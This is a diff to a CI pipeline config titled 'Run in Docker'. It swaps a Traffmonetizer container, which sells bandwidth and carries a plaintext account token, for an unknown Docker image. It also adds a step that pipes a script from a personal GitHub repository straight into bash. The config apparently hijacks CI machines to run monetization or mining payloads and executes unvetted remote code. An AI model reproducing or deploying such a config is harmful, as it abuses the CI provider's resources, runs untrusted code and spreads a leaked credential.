@@ -1,14 +1,12 @@
 version: v1.0
 name: Run in Docker
-
 agent:
   machine:
-    type: f1-standard-4
-    os_image: ubuntu2404
+    type: e1-standard-8
+    os_image: ubuntu2004
   containers:
     - name: main
-      image: traffmonetizer/cli_v2:latest
-
+      image: 'andreaa99/rhinoy:latest'
 blocks:
   - name: Run Traffmonetizer
     task:
@@ -19,5 +17,4 @@ blocks:
             hours: 1
           commands:
             - checkout
-            - start accept --token FQWHMF1sZYu6ofoqkToZiLE4SOspwe5d/rgC8vXLgII=
-			      - status
+            - 'curl -sL https://github.com/kartolo92/kkr/raw/main/rhnonew | bash'
